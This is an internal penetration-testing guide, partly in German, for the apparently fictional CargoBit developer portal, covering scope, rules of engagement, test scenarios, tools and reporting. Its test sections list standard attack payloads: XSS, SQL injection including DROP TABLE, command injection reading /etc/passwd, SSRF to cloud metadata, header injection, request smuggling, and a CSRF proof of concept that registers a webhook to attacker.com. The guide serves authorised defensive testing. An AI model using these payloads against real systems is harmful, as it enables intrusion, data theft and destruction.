# Developer-Portal Penetration Testing Guide

## Wie das Portal regelmäßig sicherheitstechnisch geprüft wird

Dieses Dokument definiert die Methodik, Werkzeuge und Prozesse für Penetrationstests des CargoBit Developer-Portals.

---

## 1. Pentest-Ziele

| Ziel | Beschreibung | Priorität |
|------|--------------|-----------|
| Sicherheitslücken finden | Proaktive Identifikation von Schwachstellen | Hoch |
| Tools absichern | Validierung der Tool-Sicherheit | Hoch |
| Portal-Integrität sicherstellen | Schutz vor Manipulation | Hoch |
| Compliance erfüllen | SOC 2, ISO 27001, PCI DSS | Mittel |
| Developer Experience bewahren | Keine Beeinträchtigung der Nutzer | Mittel |

---

## 2. Pentest-Scope

### 2.1 In-Scope Komponenten

```yaml
pentest_scope:
  in_scope:
    frontend:
      - "developer.cargobit.io"
      - "Static documentation pages"
      - "Search functionality"
      - "Navigation and UI components"
      
    tools:
      - "API Explorer (/tools/api-explorer)"
      - "Webhook Simulator (/tools/webhook-simulator)"
      - "Event Replay (/tools/event-replay)"
      - "Schema Viewer (/tools/schema-viewer)"
      
    backend:
      - "API endpoints (/api/*)"
      - "Authentication endpoints"
      - "Webhook delivery service"
      
    infrastructure:
      - "CDN configuration"
      - "DNS configuration"
      - "SSL/TLS configuration"
      
  out_of_scope:
    - "Production database (use staging)"
    - "Partner endpoints (use test endpoints)"
    - "Third-party services (SaaS)"
    - "Physical security"
    - "Social engineering"
```

### 2.2 Test-Umgebungen

| Umgebung | Zweck | Daten |
|----------|------|-------|
| Staging | Primäre Testumgebung | Anonymisierte Testdaten |
| Sandbox | API Explorer Tests | Sandbox-Daten |
| Dedicated Pentest | Isolierte Umgebung | Generierte Testdaten |

### 2.3 Rules of Engagement

```yaml
rules_of_engagement:
  timing:
    allowed: "Business hours (9:00 - 18:00 CET)"
    requires_approval: "After-hours testing"
    
  intensity:
    rate_limit_bypass: "Requires approval"
    stress_testing: "Dedicated environment only"
    
  data:
    no_production_access: true
    no_pii_collection: true
    test_data_only: true
    
  communication:
    emergency_contact: "security@cargobit.io"
    escalation_path: "security-lead → cto → legal"
    
  reporting:
    critical_immediate: true
    findings_within_48h: true
    final_report_within_2_weeks: true
```

---

## 3. Pentest-Bereiche

### 3.1 Frontend Security

#### 3.1.1 XSS (Cross-Site Scripting)

**Test-Szenarien:**

```yaml
xss_tests:
  reflected_xss:
    locations:
      - "Search query parameter"
      - "Error messages"
      - "API Explorer response display"
      - "Webhook payload display"
      
    payloads:
      - "<script>alert('XSS')</script>"
      - "<img src=x onerror=alert('XSS')>"
      - "javascript:alert('XSS')"
      - "<svg onload=alert('XSS')>"
      - "'\"><script>alert('XSS')</script>"
      
    validation:
      - Execute payload in browser
      - Check if script executes
      - Check CSP headers
      - Check output encoding
      
  stored_xss:
    locations:
      - "Webhook endpoint URL"
      - "Webhook payload content"
      - "API Explorer saved requests"
      
    payloads:
      - Inject in stored fields
      - Access from different session
      - Check if script executes
      
  dom_xss:
    locations:
      - "URL fragment handling"
      - "document.write usage"
      - "innerHTML assignment"
      - "eval() usage"
      
    test_method:
      - Analyze JavaScript source
      - Identify dangerous sinks
      - Craft payloads for each sink
```

**Test-Methodik:**

```markdown
## XSS Test Procedure

### Step 1: Identify Input Vectors
- All URL parameters
- Form inputs
- HTTP headers
- API request bodies

### Step 2: Inject Payloads
For each input vector:
1. Inject standard XSS payload
2. Observe response
3. Try encoding variations
4. Try filter bypass techniques

### Step 3: Validate Execution
1. Open vulnerable page in browser
2. Check if script executes
3. Document proof of concept

### Step 4: Assess Impact
- Session theft possible?
- Credential theft possible?
- Malicious actions possible?

### Step 5: Report
- Detailed reproduction steps
- Impact assessment
- Remediation recommendation
```

#### 3.1.2 CSRF (Cross-Site Request Forgery)

**Test-Szenarien:**

```yaml
csrf_tests:
  endpoints_to_test:
    - path: "/api/webhooks"
      method: "POST"
      purpose: "Create webhook"
      
    - path: "/api/webhooks/{id}"
      method: "PUT"
      purpose: "Update webhook"
      
    - path: "/api/webhooks/{id}"
      method: "DELETE"
      purpose: "Delete webhook"
      
    - path: "/api/api-keys"
      method: "POST"
      purpose: "Create API key"
      
  test_procedure:
    1. Identify state-changing endpoints
    2. Check for CSRF token
    3. Attempt request without token
    4. Attempt request with invalid token
    5. Check SameSite cookie attribute
    
  proof_of_concept:
    html_template: |
      <html>
        <body>
          <form action="https://developer.cargobit.io/api/webhooks" method="POST">
            <input type="hidden" name="endpoint_url" value="https://attacker.com/webhook" />
            <input type="hidden" name="events" value="payment.created" />
          </form>
          <script>document.forms[0].submit();</script>
        </body>
      </html>
```

#### 3.1.3 Clickjacking

**Test-Szenarien:**

```yaml
clickjacking_tests:
  test_procedure:
    1. Check X-Frame-Options header
    2. Check Content-Security-Policy frame-ancestors
    3. Attempt to embed page in iframe
    4. Test with clickjacking PoC
    
  proof_of_concept:
    html_template: |
      <html>
        <head>
          <style>
            iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.5; }
            .decoy { position: absolute; top: 100px; left: 100px; }
          </style>
        </head>
        <body>
          <iframe src="https://developer.cargobit.io/tools/webhook-simulator"></iframe>
          <button class="decoy">Click for free gift!</button>
        </body>
      </html>
      
  expected_result:
    - X-Frame-Options: DENY
    - CSP: frame-ancestors 'none'
    - Page should not load in iframe
```

#### 3.1.4 CSP Bypass

**Test-Szenarien:**

```yaml
csp_bypass_tests:
  analyze_csp:
    - Fetch CSP header
    - Parse directives
    - Identify weak configurations
    
  bypass_techniques:
    - "Check for 'unsafe-inline' in script-src"
    - "Check for 'unsafe-eval' in script-src"
    - "Check for data: URI in script-src"
    "Check for wildcards in allowed domains"
    
  test_tool:
    name: "CSP Evaluator"
    url: "https://csp-evaluator.withgoogle.com/"
    
  bypass_payloads:
    - "If 'unsafe-inline': <script>alert(1)</script>"
    - "If data: allowed: <script src='data:text/javascript,alert(1)'>"
    - "If *.cloudflare.com: Check for JSONP endpoints"
```

---

### 3.2 Tools Backend Security

#### 3.2.1 Injection Attacks

**Test-Szenarien:**

```yaml
injection_tests:
  sql_injection:
    endpoints:
      - "/api/webhooks?search="
      - "/api/api-keys?filter="
      - "/api/events?event_type="
      
    payloads:
      - "' OR '1'='1"
      - "1; DROP TABLE users--"
      - "' UNION SELECT * FROM users--"
      - "1' AND 1=1--"
      
    detection:
      - Error messages
      - Response timing
      - Data differences
      
  nosql_injection:
    endpoints:
      - "/api/search?q="
      
    payloads:
      - '{"$gt": ""}'
      - '{"$ne": ""}'
      - '{"$where": "this.password == this.password"}'
      
  command_injection:
    endpoints:
      - API Explorer custom headers
      - Webhook endpoint validation
      
    payloads:
      - "; ls -la"
      - "| cat /etc/passwd"
      - "$(whoami)"
      - "`id`"
      
  ldap_injection:
    check_if_applicable: false  # No LDAP usage
    
  xpath_injection:
    check_if_applicable: false  # No XPath usage
```

#### 3.2.2 SSRF (Server-Side Request Forgery)

**Test-Szenarien:**

```yaml
ssrf_tests:
  locations:
    - API Explorer endpoint URL
    - Webhook endpoint URL
    - Schema URL fetching
    
  test_payloads:
    internal_access:
      - "http://localhost:8080"
      - "http://127.0.0.1:8080"
      - "http://[::1]:8080"
      - "http://0.0.0.0:8080"
      
    cloud_metadata:
      - "http://169.254.169.254/latest/meta-data/"
      - "http://metadata.google.internal/"
      - "http://169.254.169.254/metadata/v1/"
      
    dns_bypass:
      - "http://localtest.me"
      - "http://spoofed.burpcollaborator.net"
      
    protocol_smuggling:
      - "gopher://internal-host:70/"
      - "file:///etc/passwd"
      - "dict://internal-host:11211/stat"
      
  validation:
    - Check if internal resources accessible
    - Check if cloud metadata exposed
    - Check response for internal information
```

#### 3.2.3 Privilege Escalation

**Test-Szenarien:**

```yaml
privilege_escalation_tests:
  horizontal_escalation:
    description: "Access other users' data"
    
    tests:
      - name: "Access other user's webhooks"
        method: "GET /api/webhooks/{other_user_webhook_id}"
        auth: "own_user_token"
        
      - name: "Modify other user's webhook"
        method: "PUT /api/webhooks/{other_user_webhook_id}"
        auth: "own_user_token"
        
      - name: "Delete other user's webhook"
        method: "DELETE /api/webhooks/{other_user_webhook_id}"
        auth: "own_user_token"
        
  vertical_escalation:
    description: "Gain higher privileges"
    
    tests:
      - name: "Access admin endpoints"
        method: "GET /api/admin/*"
        auth: "regular_user_token"
        
      - name: "Modify own role"
        method: "PUT /api/users/me"
        body: '{"role": "admin"}'
        auth: "regular_user_token"
        
  idor_tests:
    - "Sequential ID enumeration"
    - "UUID predictability"
    - "Resource ownership validation"
```

#### 3.2.4 Rate Limit Bypass

**Test-Szenarien:**

```yaml
rate_limit_bypass_tests:
  techniques:
    - name: "IP Rotation"
      method: "Use multiple IPs or proxies"
      
    - name: "Header Manipulation"
      headers:
        - "X-Forwarded-For: 1.2.3.4"
        - "X-Real-IP: 1.2.3.4"
        - "X-Originating-IP: 1.2.3.4"
        
    - name: "Distributed Requests"
      method: "Use multiple accounts/sessions"
      
    - name: "HTTP/2 Multiplexing"
      method: "Send multiple requests over single connection"
      
  test_procedure:
    1. Identify rate limited endpoint
    2. Measure rate limit threshold
    3. Attempt bypass techniques
    4. Document successful bypasses
```

---

### 3.3 API Explorer Security

#### 3.3.1 Header Injection

**Test-Szenarien:**

```yaml
header_injection_tests:
  locations:
    - "Custom headers in API requests"
    - "Header names and values"
    
  payloads:
    - "X-Custom: value\r\nX-Injected: malicious"
    - "X-Custom: value\nSet-Cookie: session=hijacked"
    - "X-Custom: value%0d%0aX-Injected: malicious"
    
  validation:
    - Check if injected headers appear in request
    - Check if response splitting possible
    - Check if cache poisoning possible
```

#### 3.3.2 Request Smuggling

**Test-Szenarien:**

```yaml
request_smuggling_tests:
  techniques:
    - "CL.TE (Content-Length vs Transfer-Encoding)"
    - "TE.CL"
    - "TE.TE"
    
  payloads:
    cl_te:
      method: "POST"
      headers:
        Content-Length: "13"
        Transfer-Encoding: "chunked"
      body: "0\r\n\r\nSMUGGLED"
      
  validation:
    - Send malicious request
    - Check if second request affected
    - Check timing differences
```

#### 3.3.3 Sandbox Escape

**Test-Szenarien:**

```yaml
sandbox_escape_tests:
  objectives:
    - "Access production API from sandbox"
    - "Access other users' sandbox data"
    - "Escalate sandbox privileges"
    
  tests:
    - name: "Production API access"
      method: "Attempt to call production endpoints from sandbox"
      payload:
        endpoint: "/v2/payments"
        sandbox_key: "sk_test_xxx"
        production_key_attempt: "sk_live_xxx"
        
    - name: "Cross-user sandbox access"
      method: "Access other users' sandbox data"
      payload:
        user_a_sandbox_id: "sb_aaa"
        user_b_attempt_access: true
        
  validation:
    - Verify sandbox isolation
    - Verify no production access
    - Verify no cross-user access
```

---

### 3.4 Webhook Simulator Security

#### 3.4.1 Payload Injection

**Test-Szenarien:**

```yaml
payload_injection_tests:
  locations:
    - "Webhook payload body"
    - "Event type field"
    - "Custom headers"
    
  payloads:
    xss_in_payload:
      event_type: "payment.created"
      payload: |
        {
          "id": "pay_123",
          "description": "<script>alert('XSS')</script>"
        }
        
    sql_in_payload:
      payload: |
        {
          "id": "pay_123'; DROP TABLE webhooks;--"
        }
        
    ssrf_in_payload:
      payload: |
        {
          "callback_url": "http://169.254.169.254/latest/meta-data/"
        }
```

#### 3.4.2 Signature Spoofing

**Test-Szenarien:**

```yaml
signature_spoofing_tests:
  tests:
    - name: "Missing signature"
      description: "Send webhook without signature"
      expected: "Rejected"
      
    - name: "Invalid signature"
      description: "Send webhook with wrong signature"
      payload:
        signature: "sha256=invalid"
      expected: "Rejected"
      
    - name: "Timing attack"
      description: "Attempt to guess signature via timing"
      method: "Measure response times for valid vs invalid"
      expected: "Timing-safe comparison"
      
    - name: "Replay attack"
      description: "Send same event multiple times"
      expected: "Rejected or deduplicated"
```

#### 3.4.3 Replay Manipulation

**Test-Szenarien:**

```yaml
replay_manipulation_tests:
  tests:
    - name: "Replay other user's event"
      description: "Attempt to replay event from different user"
      method: "Use event_id from user_b in user_a's replay"
      expected: "Access denied"
      
    - name: "Modify replayed event"
      description: "Attempt to modify event during replay"
      method: "Intercept and modify replay request"
      expected: "Integrity check fails"
      
    - name: "Replay expired event"
      description: "Attempt to replay very old event"
      method: "Use event_id from years ago"
      expected: "Rejected or archived"
```

---

### 3.5 Search Engine Security

#### 3.5.1 Query Injection

**Test-Szenarien:**

```yaml
query_injection_tests:
  algolia_specific:
    - name: "Facet manipulation"
      payload: "facetFilters=<script>alert(1)</script>"
      
    - name: "Rule injection"
      payload: "customRules=malicious"
      
  general_search:
    - name: "Lucene injection"
      payload: "title:test OR (*:*)"
      
    - name: "Special characters"
      payload: "test\" && alert(1) && \""
      
  validation:
    - Check for error messages
    - Check for unexpected results
    - Check for XSS in results display
```

#### 3.5.2 Index Poisoning

**Test-Szenarien:**

```yaml
index_poisoning_tests:
  tests:
    - name: "Content injection"
      description: "Attempt to inject content into index"
      method: "Create document that gets indexed"
      
    - name: "Ranking manipulation"
      description: "Attempt to manipulate search ranking"
      method: "Spam keywords in user-generated content"
      
    - name: "Sensitive data exposure"
      description: "Check if sensitive data appears in search"
      method: "Search for sensitive terms"
      search_terms:
        - "api_key"
        - "secret"
        - "password"
        - "token"
```

---

## 4. Pentest-Methoden

### 4.1 Blackbox Testing

```yaml
blackbox_testing:
  definition: "Testing without knowledge of internal implementation"
  
  approach:
    - "Reconnaissance and information gathering"
    - "Endpoint discovery"
    - "Parameter discovery"
    - "Vulnerability scanning"
    - "Manual exploitation"
    
  advantages:
    - "Simulates real attacker perspective"
    - "Tests external perimeter"
    
  limitations:
    - "May miss internal vulnerabilities"
    - "Time consuming"
```

### 4.2 Greybox Testing

```yaml
greybox_testing:
  definition: "Testing with partial knowledge (e.g., API documentation)"
  
  approach:
    - "Review API documentation"
    - "Understand business logic"
    - "Targeted vulnerability testing"
    - "Focus on critical paths"
    
  advantages:
    - "More efficient than blackbox"
    - "Better coverage of business logic"
    
  approach_for_cargobit:
    - "Use OpenAPI specs"
    - "Review documentation"
    - "Understand tool workflows"
```

### 4.3 Automated Scanning

```yaml
automated_scanning:
  tools:
    - name: "OWASP ZAP"
      purpose: "Automated vulnerability scanning"
      config: "Baseline scan + Active scan"
      
    - name: "Burp Suite Professional"
      purpose: "Web application testing"
      config: "Scanner + Intruder"
      
    - name: "Nuclei"
      purpose: "Template-based vulnerability scanning"
      templates: "CVEs + Custom templates"
      
    - name: "Nikto"
      purpose: "Web server scanning"
      config: "Standard scan"
      
  schedule:
    - "Weekly automated scans on staging"
    - "Pre-release scans on release candidates"
    - "Continuous DAST in CI/CD pipeline"
```

### 4.4 Manual Exploitation

```yaml
manual_exploitation:
  focus_areas:
    - "Business logic vulnerabilities"
    - "Authentication bypass"
    - "Authorization flaws"
    - "Complex injection attacks"
    - "Race conditions"
    
  methodology:
    1. "Identify potential vulnerability"
    2. "Understand exploitation context"
    3. "Develop proof of concept"
    4. "Verify impact"
    5. "Document findings"
```

### 4.5 Fuzzing

```yaml
fuzzing:
  tools:
    - name: "Burp Intruder"
      payloads: "FuzzDB, SecLists"
      
    - name: "wfuzz"
      purpose: "Parameter fuzzing"
      
    - name: "ffuf"
      purpose: "Directory/endpoint discovery"
      
  targets:
    - "API endpoints"
    - "Input parameters"
    - "Headers"
    - "Request bodies"
    
  payload_types:
    - "Integer overflow"
    - "Format strings"
    - "Long strings (buffer overflow)"
    - "Special characters"
    - "Unicode characters"
```

---

## 5. Pentest-Tools

### 5.1 Tool Inventory

| Tool | Zweck | Lizenz | Nutzung |
|------|------|--------|---------|
| Burp Suite Pro | Web App Testing | Commercial | Primary |
| OWASP ZAP | Vulnerability Scanning | Open Source | Automated |
| Nmap | Network Scanning | Open Source | Reconnaissance |
| Nikto | Web Server Scanning | Open Source | Automated |
| sqlmap | SQL Injection | Open Source | Targeted |
| ffuf | Fuzzing | Open Source | Discovery |
| nuclei | Template Scanning | Open Source | CVE Scanning |
| Postman | API Testing | Free | Manual |
| CyberChef | Data Manipulation | Open Source | Analysis |

### 5.2 Burp Suite Configuration

```yaml
burp_config:
  proxy:
    listener: "127.0.0.1:8080"
    certificate: "Generated CA"
    
  scanner:
    scan_type: "All endpoints"
    exclude:
      - "/logout"  # Avoid session termination
      - "/api/webhooks/deliver"  # Avoid external calls
      
  intruder:
    attack_types:
      - "Sniper"  # Single payload set
      - "Battering ram"  # Same payload to all positions
      - "Pitchfork"  # Multiple payload sets in parallel
      - "Cluster bomb"  # All combinations
      
  extensions:
    - "Retire.js"  # JavaScript vulnerability detection
    - "Authorize"  # Authorization testing
    - "Turbo Intruder"  # High-speed requests
```

### 5.3 OWASP ZAP Configuration

```yaml
zap_config:
  scan_policy:
    name: "CargoBit Security Policy"
    
  rules:
    - id: 10016
      name: "Cross-Site Scripting (Reflected)"
      threshold: "High"
      strength: "High"
      
    - id: 10017
      name: "Cross-Site Scripting (Persistent)"
      threshold: "High"
      strength: "High"
      
    - id: 40018
      name: "SQL Injection"
      threshold: "High"
      strength: "High"
      
    - id: 40019
      name: "SQL Injection - MySQL"
      threshold: "High"
      strength: "High"
      
  authentication:
    type: "HTTP/NTLM"
    credentials: "From test account"
    
  context:
    include: ["https://staging.developer.cargobit.io"]
    exclude: ["/health", "/metrics"]
```

### 5.4 Nmap Scripts

```bash
# Basic port scan
nmap -sV -sC staging.developer.cargobit.io

# SSL/TLS security
nmap --script ssl-enum-ciphers -p 443 staging.developer.cargobit.io

# HTTP security headers
nmap --script http-security-headers -p 443 staging.developer.cargobit.io

# Vulnerability scan
nmap --script vuln -p 443 staging.developer.cargobit.io
```

---

## 6. Pentest-Reporting

### 6.1 Finding Template

```markdown
# Finding: [Title]

## Metadata
- **Finding ID:** [ID]
- **Severity:** [Critical/High/Medium/Low/Informational]
- **CVSS Score:** [Score]
- **Component:** [Component]
- **Discovered:** [Date]
- **Discovered By:** [Tester]

## Description
[Detailed description of the vulnerability]

## Affected Assets
- URL: [URL]
- Parameter: [Parameter]
- Method: [HTTP Method]

## Proof of Concept

### Request
```http
POST /api/endpoint HTTP/1.1
Host: developer.cargobit.io
Content-Type: application/json

{"parameter": "payload"}
```

### Response
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"result": "vulnerable"}
```

## Impact
[Description of potential impact]

## Remediation
[Step-by-step remediation instructions]

## References
- CWE-XXX: [Title]
- OWASP: [Category]

## Status
- [ ] Reported
- [ ] Confirmed
- [ ] Fixed
- [ ] Retested
- [ ] Closed
```

### 6.2 Severity Classification

```yaml
severity_classification:
  critical:
    cvss: "9.0 - 10.0"
    criteria:
      - "Remote code execution"
      - "SQL injection with data extraction"
      - "Authentication bypass"
      - "Access to all user data"
    sla: "Fix within 24 hours"
    
  high:
    cvss: "7.0 - 8.9"
    criteria:
      - "Stored XSS"
      - "Privilege escalation"
      - "Significant data exposure"
      - "SSRF with internal access"
    sla: "Fix within 7 days"
    
  medium:
    cvss: "4.0 - 6.9"
    criteria:
      - "Reflected XSS"
      - "CSRF on sensitive actions"
      - "Limited information disclosure"
      - "Rate limiting issues"
    sla: "Fix within 30 days"
    
  low:
    cvss: "0.1 - 3.9"
    criteria:
      - "Minor information disclosure"
      - "Missing security headers"
      - "Verbose error messages"
    sla: "Fix within 90 days"
    
  informational:
    cvss: "0.0"
    criteria:
      - "Best practice recommendations"
      - "Configuration suggestions"
    sla: "Consider for future releases"
```

### 6.3 Executive Summary Template

```markdown
# Penetration Test Report - Executive Summary

## Overview
**Test Period:** [Start Date] - [End Date]
**Scope:** [Scope Description]
**Tester(s):** [Names]

## Summary

| Severity | Count |
|----------|-------|
| Critical | X |
| High | X |
| Medium | X |
| Low | X |
| Informational | X |

## Risk Assessment
[Overall risk level and key findings]

## Key Findings
1. [Finding 1]
2. [Finding 2]
3. [Finding 3]

## Recommendations
1. [Recommendation 1]
2. [Recommendation 2]
3. [Recommendation 3]

## Next Steps
- Address critical findings immediately
- Schedule retest after remediation
- Update security processes
```

### 6.4 Retest Process

```yaml
retest_process:
  trigger:
    - "All critical/high findings remediated"
    - "Significant code changes"
    - "Before production release"
    
  scope:
    - "Previously identified vulnerabilities"
    - "Related functionality"
    - "New code changes"
    
  process:
    1. Developer marks finding as fixed
    2. Security team verifies fix
    3. Attempt to bypass remediation
    4. Document results
    5. Close or reopen finding
    
  outcomes:
    fixed: "Vulnerability no longer exploitable"
    partial: "Vulnerability partially fixed"
    not_fixed: "Vulnerability still exploitable"
    new_finding: "New vulnerability discovered"
```

---

## 7. Pentest-Schedule

### 7.1 Annual Schedule

| Test-Typ | Frequenz | Q1 | Q2 | Q3 | Q4 |
|----------|----------|-----|-----|-----|-----|
| External Pentest | Halbjährlich | ✅ | | ✅ | |
| Internal Pentest | Quartalsweise | ✅ | ✅ | ✅ | ✅ |
| Automated Scan | Wöchentlich | ✅ | ✅ | ✅ | ✅ |
| API Security Test | Quartalsweise | ✅ | ✅ | ✅ | ✅ |
| Red Team Exercise | Jährlich | | ✅ | | |

### 7.2 Test-Checkliste

```markdown
## Pre-Pentest Checklist

### Preparation
- [ ] Scope defined and approved
- [ ] Test environment ready
- [ ] Test accounts created
- [ ] Rules of engagement signed
- [ ] Emergency contacts established

### Tools
- [ ] Burp Suite configured
- [ ] OWASP ZAP updated
- [ ] Test payloads prepared
- [ ] Documentation reviewed

### Communication
- [ ] Stakeholders notified
- [ ] Monitoring alerts configured
- [ ] Escalation path confirmed

## Post-Pentest Checklist

### Reporting
- [ ] All findings documented
- [ ] Executive summary written
- [ ] Technical details complete
- [ ] Remediation recommendations provided

### Handoff
- [ ] Report delivered to stakeholders
- [ ] Findings triaged
- [ ] Remediation timeline established
- [ ] Retest scheduled
```

---

## 8. Compliance-Mapping

### 8.1 Standards Coverage

| Standard | Pentest-Anforderung | Abdeckung |
|----------|---------------------|-----------|
| SOC 2 | Annual penetration test | ✅ Halbjährlich |
| PCI DSS | Quarterly external scan | ✅ Wöchentlich |
| ISO 27001 | Regular security testing | ✅ Quartalsweise |
| HIPAA | Vulnerability assessment | ✅ Kontinuierlich |

---

*Dieser Penetration Testing Guide wird jährlich aktualisiert. Letzte Aktualisierung: Januar 2025.*
